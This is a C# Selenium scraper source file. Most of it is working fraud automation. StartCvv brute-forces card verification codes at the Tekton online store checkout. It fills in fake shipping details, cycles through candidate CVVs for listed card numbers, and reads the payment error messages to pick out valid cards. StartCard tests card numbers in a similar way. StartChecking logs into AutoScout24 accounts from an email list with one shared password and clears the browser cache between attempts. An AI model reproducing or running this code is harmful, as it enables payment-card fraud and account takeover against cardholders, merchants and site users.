using Newtonsoft.Json.Linq;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.UI;
using SeleniumExtras.WaitHelpers;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace AutoScout24
{
    class Scraper : IDisposable
    {

        public static String GetNumbers(String input)
        {
            return new String(input.Where(c => char.IsDigit(c)).ToArray());
        }

        public static String GetNowDateTimeString()
        {
            return DateTime.Now.ToString("yyyy-MM-dd  HH:mm:ss");
        }

        public static Func<IWebDriver, bool> UrlContains(string fraction)
        {
            return (driver) => { return driver.Url.ToLowerInvariant().Contains(fraction.ToLowerInvariant()); };
        }

        private const int DEFAULT_TIMEOUT_PAGELOAD = 180;
        private const String SUFFIX_AUTO = "    (AUTO)";
        public const String LOG_FILENAME = "log.txt";
        private RandomGenerator Random = new RandomGenerator();
        private IWebDriver ChromeDriver;
        private WebDriverWait Wait1;
        private WebDriverWait Wait3;
        private WebDriverWait Wait15;
        private WebDriverWait Wait30;
        private WebDriverWait Wait180;
        private IJavaScriptExecutor JSE;

        public Scraper()
        {
            ChromeOptions options = new ChromeOptions();
            var chromeDriverService = ChromeDriverService.CreateDefaultService();
            chromeDriverService.HideCommandPromptWindow = true;
            //String username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            //if (username == @"DESKTOP-2KTBPSE\Valloon")
            //{
            //    var proxy = new Proxy();
            //    proxy.Kind = ProxyKind.Manual;
            //    proxy.IsAutoDetect = false;
            //    proxy.HttpProxy = proxy.SslProxy = "81.177.48.86:80";
            //    options.Proxy = proxy;
            //}

            //options.AddArgument("--start-maximized");
            //options.AddArgument("--auth-server-whitelist");
            //options.AddArguments("--disable-extensions");
            options.AddArgument("--ignore-certificate-errors");
            options.AddArgument("--ignore-ssl-errors");
            options.AddArgument("--system-developer-mode");
            options.AddArgument("--no-first-run");
            options.SetLoggingPreference(LogType.Driver, LogLevel.All);
            //chromeOptions.AddArguments("--disk-cache-size=0");
            //options.AddArgument("--user-data-dir=" + m_chr_user_data_dir);
#if !DEBUG
            options.AddArguments("--headless");
            options.AddArguments("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");
            options.AddArguments("--disable-plugins-discovery");
            //options.AddArguments("--profile-directory=Default");
            //options.AddArguments("--no-sandbox");
            //options.AddArguments("--incognito");
            //options.AddArguments("--disable-gpu");
            //options.AddArguments("--no-first-run");
            //options.AddArguments("--ignore-certificate-errors");
            //options.AddArguments("--start-maximized");
            //options.AddArguments("disable-infobars");

            //options.AddAdditionalCapability("acceptInsecureCerts", true, true);
#endif
            ChromeDriver = new ChromeDriver(chromeDriverService, options, TimeSpan.FromSeconds(DEFAULT_TIMEOUT_PAGELOAD));
            ChromeDriver.Manage().Window.Position = new Point(0, 0);
            ChromeDriver.Manage().Window.Size = new Size(1024, 720);
            ChromeDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(5);
            JSE = (IJavaScriptExecutor)ChromeDriver;
            Wait1 = new WebDriverWait(ChromeDriver, TimeSpan.FromSeconds(1));
            Wait1.IgnoreExceptionTypes(typeof(StaleElementReferenceException));
            Wait3 = new WebDriverWait(ChromeDriver, TimeSpan.FromSeconds(3));
            Wait3.IgnoreExceptionTypes(typeof(StaleElementReferenceException));
            Wait15 = new WebDriverWait(ChromeDriver, TimeSpan.FromSeconds(15));
            Wait15.IgnoreExceptionTypes(typeof(StaleElementReferenceException));
            Wait30 = new WebDriverWait(ChromeDriver, TimeSpan.FromSeconds(30));
            Wait30.IgnoreExceptionTypes(typeof(StaleElementReferenceException));
            Wait180 = new WebDriverWait(ChromeDriver, TimeSpan.FromSeconds(180));
            Wait180.IgnoreExceptionTypes(typeof(StaleElementReferenceException));
        }

        Thread playThread;

        public void RunCvv(string cvvText, string cardText)
        {
            if (playThread == null)
            {
                playThread = new Thread(() => StartCvv(cvvText, cardText));
                playThread.Start();
            }
            else
            {
                try
                {
                    playThread.Abort();
                }
                catch (Exception) { }
                playThread = null;
            }
        }

        public void StartCvv(string cvvText, string cardText)
        {
            string[] cardArray = cardText.Split(new string[] { "\n" }, StringSplitOptions.RemoveEmptyEntries);
            {
                var list = new List<string>();
                foreach (var item in cardArray)
                {
                    if (string.IsNullOrWhiteSpace(item)) continue;
                    list.Add(item.Trim());
                }
                cardArray = list.ToArray();
            }
            int cardCount = cardArray.Length;

            string[] cvvArray = cvvText.Split(new string[] { "\n" }, StringSplitOptions.RemoveEmptyEntries);

            string filename = $"{DateTime.Now:yyyy-MM-dd  HH.mm.ss}.txt";
            Logger logger = new Logger(filename);
            string baseUrl = "https://www.tekton.com/";

            void login()
            {
                logger.WriteLine();
                logger.WriteLine($"Opening webpage...");
                string url = baseUrl + "conversion-chart-card-apg40001";
                logger.WriteLine($"{url}", ConsoleColor.Green);
                ChromeDriver.Navigate().GoToUrl(url);
                var aCheckOut = By.CssSelector("a[href=\"/checkout\"");
                while (true)
                {
                    var buttonSubmitSelector = By.CssSelector("button[aria-label=\"Add to Cart\"]");
                    ChromeDriver.FindElement(buttonSubmitSelector).Click();
                    Wait180.Until(d => !d.FindElement(buttonSubmitSelector).GetAttribute("class").Contains("cursor-not-allowed"));
                    if (ChromeDriver.FindElements(aCheckOut).Count > 0)
                    {
                        Wait3.Until(ExpectedConditions.ElementIsVisible(aCheckOut));
                        ChromeDriver.FindElement(aCheckOut).Click();
                        break;
                    }
                }
                {
                    var buttonContinueAsGuestSelector = By.CssSelector("form:nth-of-type(2) button");
                    Wait30.Until(ExpectedConditions.ElementIsVisible(buttonContinueAsGuestSelector));
                    ChromeDriver.FindElement(buttonContinueAsGuestSelector).Click();
                    var inputFirstNameSelector = By.CssSelector("form:nth-of-type(2) input[name=\"firstName\"");
                    Wait1.Until(ExpectedConditions.ElementIsVisible(inputFirstNameSelector));
                    var inputFirstName = ChromeDriver.FindElement(inputFirstNameSelector);
                    inputFirstName.SendKeys("Billy");
                    var inputLastNameSelector = By.CssSelector("form:nth-of-type(2) input[name=\"lastName\"");
                    var inputLastName = ChromeDriver.FindElement(inputLastNameSelector);
                    inputLastName.SendKeys("Billy");
                    var inputEmailSelector = By.CssSelector("form:nth-of-type(2) input[name=\"email\"");
                    var inputEmail = ChromeDriver.FindElement(inputEmailSelector);
                    inputEmail.SendKeys("billy12345@gmail.com");
                    var buttonSubmitSelector = By.CssSelector("form:nth-of-type(2) button[type=\"submit\"]");
                    ChromeDriver.FindElement(buttonSubmitSelector).Click();
                    //if (ChromeDriver.FindElements(buttonSubmitSelector).Count > 0)
                    //    Wait60.Until(d => !d.FindElement(buttonSubmitSelector).GetAttribute("class").Contains("cursor-not-allowed"));
                }
                {
                    var inputAddr1Selector = By.CssSelector("input[name=\"addr1\"");
                    Wait180.Until(ExpectedConditions.ElementIsVisible(inputAddr1Selector));

                    var inputFirstNameSelector = By.CssSelector("input[name=\"firstName\"");
                    var inputFirstName = ChromeDriver.FindElement(inputFirstNameSelector);
                    inputFirstName.SendKeys("Billy");
                    var inputLastNameSelector = By.CssSelector("input[name=\"lastName\"");
                    var inputLastName = ChromeDriver.FindElement(inputLastNameSelector);
                    inputLastName.SendKeys("Billy");
                    var inputPhoneSelector = By.CssSelector("input[name=\"phone\"");
                    var inputPhone = ChromeDriver.FindElement(inputPhoneSelector);
                    inputPhone.SendKeys("9093223513");
                    var inputAddr1 = ChromeDriver.FindElement(inputAddr1Selector);
                    inputAddr1.SendKeys("dress");
                    var inputCitySelector = By.CssSelector("input[name=\"city\"");
                    var inputCity = ChromeDriver.FindElement(inputCitySelector);
                    inputCity.SendKeys("ity");
                    var inputZipSelector = By.CssSelector("input[name=\"zip\"");
                    var inputZip = ChromeDriver.FindElement(inputZipSelector);
                    inputZip.SendKeys("10001");
                    var inputStateSelector = By.CssSelector("select[name=\"state\"");
                    var inputState = ChromeDriver.FindElement(inputStateSelector);
                    var inputStateSelect = new SelectElement(inputState);
                    inputStateSelect.SelectByValue("NY");
                    var buttonSubmitSelector = By.CssSelector("button[type=\"submit\"]");
                    Wait3.Until(ExpectedConditions.ElementToBeClickable(buttonSubmitSelector));
                    ChromeDriver.FindElement(buttonSubmitSelector).Click();
                }
                {
                    var inputRadioDeliverBySelector = By.CssSelector("form input[type=\"radio\"]");
                    Wait180.Until(ExpectedConditions.ElementToBeClickable(inputRadioDeliverBySelector));
                    var inputRadioDeliverBy = ChromeDriver.FindElement(inputRadioDeliverBySelector);
                    //inputRadioDeliverBy.Click();
                    ((IJavaScriptExecutor)ChromeDriver).ExecuteScript("arguments[0].click();", inputRadioDeliverBy);

                    var inputRadioPayWithSelector = By.CssSelector("input[name=\"payment-stripe\"]");
                    Wait180.Until(ExpectedConditions.ElementToBeClickable(inputRadioPayWithSelector));
                    //var inputRadioPayWith = ChromeDriver.FindElement(inputRadioPayWithSelector);
                    //inputRadioPayWith.Click();
                }
                while (true)
                {
                    try
                    {
                        var inputCheckSameAddressSelector = By.CssSelector("input[name=\"isSameAsShippingAddress\"]");
                        Wait15.Until(ExpectedConditions.ElementToBeClickable(inputCheckSameAddressSelector));
                        var inputCheckSameAddress = ChromeDriver.FindElement(inputCheckSameAddressSelector);
                        if (!inputCheckSameAddress.Selected)
                            inputCheckSameAddress.Click();
                        break;
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine(ex);
                        logger.WriteLine("Failed to load iframe. retry...", ConsoleColor.Red, false);
                        ChromeDriver.Navigate().Refresh();
                    }
                }
            }

            login();
            for (int ci = 0; ci < cardCount; ci++)
            {
                string value = cardArray[ci].Trim();
                logger.WriteLine("\r\n" + value);
                string[] vs = value.Split('|');
                string cardNum = vs[0];
                string month = vs[1];
                string year = vs[2];
                string testCvc = null;
                if (vs.Length > 3) testCvc = vs[3];
                if (year.Length == 4) year = year.Substring(2);
                logger.WriteLine($"[{ci + 1} / {cardCount}] \t cardnum = {cardNum} \t exp = {month} / {year}");

                var frame = ChromeDriver.SwitchTo().Frame(ChromeDriver.FindElement(By.CssSelector("form iframe")));
                var inputCardNumSelector = By.CssSelector("input[name=\"number\"");
                Wait30.Until(ExpectedConditions.ElementToBeClickable(inputCardNumSelector));
                var inputCardNum = frame.FindElement(inputCardNumSelector);
                ClearWebField(inputCardNum);
                inputCardNum.SendKeys(cardNum);
                var inputExpSelector = By.CssSelector("input[name=\"expiry\"");
                var inputExp = frame.FindElement(inputExpSelector);
                ClearWebField(inputExp);
                inputExp.SendKeys(month + year);

                ChromeDriver.SwitchTo().DefaultContent();

                List<string> cvvList;
                if (testCvc == null)
                {
                    cvvList = new List<string>(cvvArray);
                }
                else
                {
                    cvvList = new List<string>
                    {
                        testCvc
                    };
                }
                int cvvListCount = cvvList.Count;
                for (int c = 0; c < cvvListCount; c++)
                {
                    string cvc = cvvList[c].Trim();
                    if (cvc.Length != 3) continue;
                    var inputCheckSameAddressSelector = By.CssSelector("input[name=\"isSameAsShippingAddress\"]");
                    Wait15.Until(ExpectedConditions.ElementToBeClickable(inputCheckSameAddressSelector));
                    var inputCheckSameAddress = ChromeDriver.FindElement(inputCheckSameAddressSelector);
                    if (!inputCheckSameAddress.Selected)
                        inputCheckSameAddress.Click();

                    var inputCvcSelector = By.CssSelector("input[name=\"cvc\"");
                    frame = ChromeDriver.SwitchTo().Frame(ChromeDriver.FindElement(By.CssSelector("form iframe")));
                    var inputCvc = frame.FindElement(inputCvcSelector);
                    inputCvc.Click();
                    ClearWebField(inputCvc);
                    inputCvc.SendKeys(cvc);

                    ChromeDriver.SwitchTo().DefaultContent();
                    var buttonSubmitSelector = By.CssSelector(".button-general.button-primary");
                    var buttonSubmit = ChromeDriver.FindElement(buttonSubmitSelector);
                    buttonSubmit.Click();
                    Wait180.Until(d => !d.FindElement(buttonSubmitSelector).GetAttribute("class").Contains("cursor-not-allowed"));
                    var spanBanSelector = By.CssSelector(".transition-opacity.text-primary-red.opacity-100");
                    if (ChromeDriver.FindElements(spanBanSelector).Count > 0)
                    {
                        var spanBan = ChromeDriver.FindElement(spanBanSelector);
                        var spanBanText = spanBan.Text;
                        if (spanBanText.Contains("maximum number"))
                        {
                            logger.WriteLine($"{cvc} \t {spanBanText}", ConsoleColor.Red);
                            break;
                        }
                        if (spanBanText.Contains("Invalid account") || spanBanText.Contains("insufficient funds") || spanBanText.Contains("Your card has expired"))
                        {
                            logger.WriteLine($"{cvc} \t {spanBanText}", ConsoleColor.Yellow);
                            break;
                        }
                        logger.WriteLine($"{cvc} \t {spanBanText}", ConsoleColor.DarkGray);
                    }
                    else
                    {
                        logger.WriteLine($"{cvc} \t OK!", ConsoleColor.Green, false);
                        break;
                    }
                }
            }

            logger.WriteLine($"\r\n - END -");
            //string result = null;

            //if (string.IsNullOrWhiteSpace(value)) continue;
            //var submit = ChromeDriver.FindElement(By.Id("applyBtn"));
            //try
            //{
            //    var frame = ChromeDriver.SwitchTo().Frame("first-data-payment-field-cvv");
            //    var cvvEl = frame.FindElement(By.Id("cvv"));
            //    cvvEl.Clear();
            //    cvvEl.SendKeys(value);
            //    ChromeDriver.SwitchTo().DefaultContent();
            //    JSE.ExecuteScript("arguments[0].click();", submit);
            //    Thread.Sleep(1000);
            //    submit = ChromeDriver.FindElement(By.Id("applyBtn"));
            //    Wait1.Until(d => !d.FindElement(By.Id("applyBtn")).GetAttribute("class").Contains("ajax-button-busy"));
            //    var captcha = ChromeDriver.FindElement(By.CssSelector("#main .g-recaptcha-wrapper"));
            //    var captchaDisplay = captcha.GetCssValue("display");
            //    if (!captchaDisplay.Equals("none", StringComparison.OrdinalIgnoreCase))
            //    {
            //        logger.WriteLine("Captcha appeared. Solve captcha, fix CVV list and press \"Find CVV\" again.");
            //        logger.WriteLine();
            //        return;
            //    }
            //    logger.WriteLine($"{value}");
            //    result = value;
            //}
            //catch (Exception)
            //{
            //    logger.WriteLine();
            //    logger.WriteLine("- END -");
            //    break;
            //}
        }

        public void ClearWebField(IWebElement element)
        {
            while (element.GetAttribute("value") != "")
            {
                element.SendKeys(Keys.Backspace);
            }
        }

        Thread cardThread;

        public void RunCard(string[] array)
        {
            if (cardThread == null)
            {
                cardThread = new Thread(() => StartCard(array));
                cardThread.Start();
            }
            else
            {
                try
                {
                    cardThread.Abort();
                }
                catch (Exception) { }
                cardThread = null;
            }
        }

        private static void Print(string text = null, ConsoleColor color = ConsoleColor.White)
        {
            if (text == null)
            {
                Console.WriteLine();
                return;
            }
            Console.ForegroundColor = color;
            Console.WriteLine(text);
            Console.ForegroundColor = ConsoleColor.White;
        }

        public void StartCard(string[] array)
        {
            Print();
            string result = null;
            foreach (string s in array)
            {
                string value = s.Trim();
                if (string.IsNullOrWhiteSpace(value)) continue;
                var submit = ChromeDriver.FindElement(By.Id("applyBtn"));
                try
                {
                    var frame = ChromeDriver.SwitchTo().Frame("first-data-payment-field-card");
                    var cvvEl = frame.FindElement(By.Id("card"));
                    cvvEl.Clear();
                    cvvEl.SendKeys(value);
                    ChromeDriver.SwitchTo().DefaultContent();
                    JSE.ExecuteScript("arguments[0].click();", submit);
                    Thread.Sleep(1000);
                    submit = ChromeDriver.FindElement(By.Id("applyBtn"));
                    Wait1.Until(d => !d.FindElement(By.Id("applyBtn")).GetAttribute("class").Contains("ajax-button-busy"));
                    var captcha = ChromeDriver.FindElement(By.CssSelector("#main .g-recaptcha-wrapper"));
                    var captchaDisplay = captcha.GetCssValue("display");
                    if (!captchaDisplay.Equals("none", StringComparison.OrdinalIgnoreCase))
                    {
                        Print("Captcha appeared. Solve captcha, fix Card list and press \"Find Card\" again.");
                        Print();
                        return;
                    }
                    Print($"{value}");
                    result = value;
                }
                catch (Exception)
                {
                    Print();
                    Print("- END -");
                    break;
                }
            }
            if (result == null)
            {
                Print("Not found");
            }
            else
            {
                Print();
                Print($"Final Result:");
                Print($"{result}", ConsoleColor.Green);
                Print();
            }
        }

        public void StartCheckingThread(String password)
        {
            Thread thread = new Thread(() => StartChecking(password));
            thread.Start();
        }

        public void StartChecking(String password)
        {
            Print($"Reading data from \"{LOG_FILENAME}\"\r\n", ConsoleColor.Green);
            String[] lines = File.ReadAllText(LOG_FILENAME, Encoding.UTF8).Split(new String[] { "\r\n" }, StringSplitOptions.RemoveEmptyEntries);
            int lineCount = lines.Length;
            for (int lineIndex = 0; lineIndex < lineCount; lineIndex++)
            {
                try
                {
                    String[] words = lines[lineIndex].Split(new char[] { '-' }, 2, StringSplitOptions.RemoveEmptyEntries);
                    String email = words[0].Trim();
                    String directoryName = null;
                    if (words.Length > 1) directoryName = words[1].Trim();
                    ChromeDriver.Navigate().GoToUrl("https://angebot.autoscout24.de/ListingOverview");
                    Print($"( {lineIndex + 1} / {lineCount} )    {email}    {directoryName}    [{GetNowDateTimeString()}]");
                    if (ChromeDriver.Url.Contains("/login"))
                    {
                        var inputUsername = ChromeDriver.FindElement(By.Id("Username"));
                        Wait1.Until(SeleniumExtras.WaitHelpers.ExpectedConditions.ElementToBeClickable(inputUsername)).Click();
                        inputUsername.Clear();
                        inputUsername.SendKeys(email);
                        var inputPassword = ChromeDriver.FindElement(By.Id("Password"));
                        inputPassword.Clear();
                        inputPassword.SendKeys(password);
                        var enableRecaptcha = ChromeDriver.FindElements(By.Id("EnableRecaptcha"));
                        if (enableRecaptcha.Count < 1)
                        {
                            var submit = ChromeDriver.FindElement(By.Id("Login"));
                            JSE.ExecuteScript("arguments[0].click();", submit);
                        }
                        else
                        {
                            Print("Plese solve the captcha and click login button.", ConsoleColor.Cyan);
                            Wait1.Until(UrlContains("/ListingOverview"));
                        }
                    }
                    if (!ChromeDriver.Url.Contains("/ListingOverview"))
                    {
                        Print("\tFailed to login", ConsoleColor.Red);
                        continue;
                    }
                    Thread.Sleep(3000);
                }
                catch (Exception ex)
                {
                    Print(ex.ToString(), ConsoleColor.Red);
                }
                ClearCache();
            }
            Print($"\r\nAll completed : {lineCount} emails.    [{GetNowDateTimeString()}]\r\n\r\n\r\n", ConsoleColor.Green);
        }

        private void NavigatePageWithTimeout(String url, int timeoutSeconds = 5)
        {
            var timeout = ChromeDriver.Manage().Timeouts();
            timeout.PageLoad = TimeSpan.FromSeconds(timeoutSeconds);
            timeout.AsynchronousJavaScript = TimeSpan.FromSeconds(timeoutSeconds);
            try
            {
                ChromeDriver.Navigate().GoToUrl(url);
            }
            catch { }
            timeout.PageLoad = TimeSpan.FromSeconds(DEFAULT_TIMEOUT_PAGELOAD);
            timeout.AsynchronousJavaScript = TimeSpan.FromSeconds(DEFAULT_TIMEOUT_PAGELOAD);
        }

        private void ClearCache()
        {
            ChromeDriver.Navigate().GoToUrl("chrome://settings/clearBrowserData");
            try
            {
                IAlert alert = ChromeDriver.SwitchTo().Alert();
                alert.Accept();
                ChromeDriver.Navigate().GoToUrl("chrome://settings/clearBrowserData");
            }
            catch { }
            IWebElement root1 = ChromeDriver.FindElement(By.CssSelector("settings-ui"));
            IWebElement shadowRoot1 = expandRootElement(root1);
            IWebElement root2 = shadowRoot1.FindElement(By.CssSelector("settings-main"));
            IWebElement shadowRoot2 = expandRootElement(root2);
            IWebElement root3 = shadowRoot2.FindElement(By.CssSelector("settings-basic-page"));
            IWebElement shadowRoot3 = expandRootElement(root3);
            IWebElement root4 = shadowRoot3.FindElement(By.CssSelector("settings-section > settings-privacy-page"));
            IWebElement shadowRoot4 = expandRootElement(root4);
            IWebElement root5 = shadowRoot4.FindElement(By.CssSelector("settings-clear-browsing-data-dialog"));
            IWebElement shadowRoot5 = expandRootElement(root5);
            IWebElement root6 = shadowRoot5.FindElement(By.CssSelector("#clearBrowsingDataDialog"));
            //IWebElement root7 = root6.FindElement(By.CssSelector("cr-tabs[role='tablist']"));
            //root7.Click();
            var cacheCheckboxBasic = root6.FindElement(By.Id("cacheCheckboxBasic"));
            var shadowRoot_cacheCheckboxBasic = expandRootElement(cacheCheckboxBasic);
            var cacheCheckboxBasicCheck = shadowRoot_cacheCheckboxBasic.FindElement(By.TagName("cr-checkbox"));
            var x = cacheCheckboxBasicCheck.GetAttribute("checked");
            if (x != null)
                cacheCheckboxBasicCheck.Click();
            IWebElement clearDataButton = root6.FindElement(By.Id("clearBrowsingDataConfirm"));
            clearDataButton.Click();
        }

        private IWebElement expandRootElement(IWebElement element)
        {
            return (IWebElement)((IJavaScriptExecutor)ChromeDriver).ExecuteScript("return arguments[0].shadowRoot", element);
        }

        private String GetStringFromCssSelector(String cssSelector, String defaultValue = null)
        {
            try
            {
                IWebElement e = ChromeDriver.FindElement(By.CssSelector(cssSelector));
                return e.Text;
            }
            catch { return defaultValue; }
        }

        private Decimal? GetDecimalFromCssSelector(String cssSelector, Decimal? defaultValue = null)
        {
            try
            {
                IWebElement e = ChromeDriver.FindElement(By.CssSelector(cssSelector));
                return Convert.ToDecimal(GetNumbers(GetStringFromCssSelector(cssSelector)));
            }
            catch { return defaultValue; }
        }

        private static String JoinForCSV(IEnumerable<String> values)
        {
            List<String> list = new List<string>();
            foreach (String s in values)
            {
                list.Add("\"" + s + "\"");
            }
            return String.Join(",", list);
        }

        public void Dispose()
        {
            ChromeDriver.Close();
            ChromeDriver.Quit();
        }
    }
}
